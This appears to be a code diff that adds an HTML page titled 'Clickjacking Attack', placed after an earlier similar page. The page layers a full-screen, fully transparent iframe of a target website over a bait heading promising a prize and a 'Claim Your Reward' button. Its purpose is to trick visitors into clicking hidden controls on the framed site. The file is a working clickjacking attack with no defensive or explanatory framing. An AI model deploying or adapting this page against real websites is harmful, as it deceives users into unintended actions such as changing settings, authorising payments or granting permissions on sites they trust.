@@ -7,3 +7,31 @@
     <iframe src="https://targetwebsite.com" width="800" height="600" style="opacity: 0; position: absolute; top: 0; left: 0;"></iframe>
 </body>
 </html>
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking Attack</title>
+    <style>
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0; /* Makes the iframe invisible */
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
+    <h1>Click the button below to win a prize!</h1>
+    <button>Claim Your Reward</button>
+    
+    <iframe src="https://targetwebsite.com"></iframe> 
+</body>
+</html>
